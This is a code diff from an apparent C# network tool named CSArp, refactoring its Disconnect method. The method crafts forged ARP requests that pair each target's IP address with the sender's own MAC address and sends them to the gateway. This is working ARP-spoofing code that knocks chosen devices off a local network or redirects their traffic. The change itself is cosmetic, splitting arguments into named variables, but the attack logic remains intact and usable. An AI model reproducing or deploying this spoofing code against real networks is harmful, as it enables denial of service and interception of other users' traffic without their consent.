@@ -18,7 +18,12 @@ namespace CSArp
         private static bool disengageflag = true;
         private static ICaptureDevice capturedevice;
 
-        public static void Disconnect(IView view, Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, string interfacefriendlyname)
+        public static void Disconnect(
+            IView view,
+            Dictionary<IPAddress, PhysicalAddress> targetlist,
+            IPAddress gatewayipaddress,
+            PhysicalAddress gatewaymacaddress,
+            string interfacefriendlyname)
         {
             engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
             capturedevice = (from devicex in CaptureDeviceList.Instance where ((SharpPcap.Npcap.NpcapDevice)devicex).Interface.FriendlyName == interfacefriendlyname select devicex).ToList()[0];
@@ -26,8 +31,21 @@ namespace CSArp
             foreach (var target in targetlist)
             {
                 IPAddress myipaddress = ((SharpPcap.Npcap.NpcapDevice)capturedevice).Addresses[1].Addr.ipAddress; //possible critical point : Addresses[1] in hardcoding the index for obtaining ipv4 address
-                ArpPacket arppacketforgatewayrequest = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, target.Key);
-                var ethernetpacketforgatewayrequest = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetType.Arp)
+                var operation = ArpOperation.Request;
+                var targetHardwareAddress = PhysicalAddress.Parse("00-00-00-00-00-00");//use loop back address since it is ignored in  arp request
+                var targetProtocolAddress = gatewayipaddress;
+                var senderHardwareAddress = capturedevice.MacAddress;
+                var senderProtocolAddress = target.Key;
+
+                ArpPacket arppacketforgatewayrequest = new ArpPacket(
+                    operation, targetHardwareAddress, targetProtocolAddress, senderHardwareAddress, senderProtocolAddress);
+
+                var sourceHardwareAddress = capturedevice.MacAddress;
+                var destinationHardwareAddress = gatewaymacaddress;
+                var ethernetType = EthernetType.Arp;
+
+                var ethernetpacketforgatewayrequest = new EthernetPacket(
+                    sourceHardwareAddress, destinationHardwareAddress, ethernetType)
                 {
                     PayloadPacket = arppacketforgatewayrequest
                 };
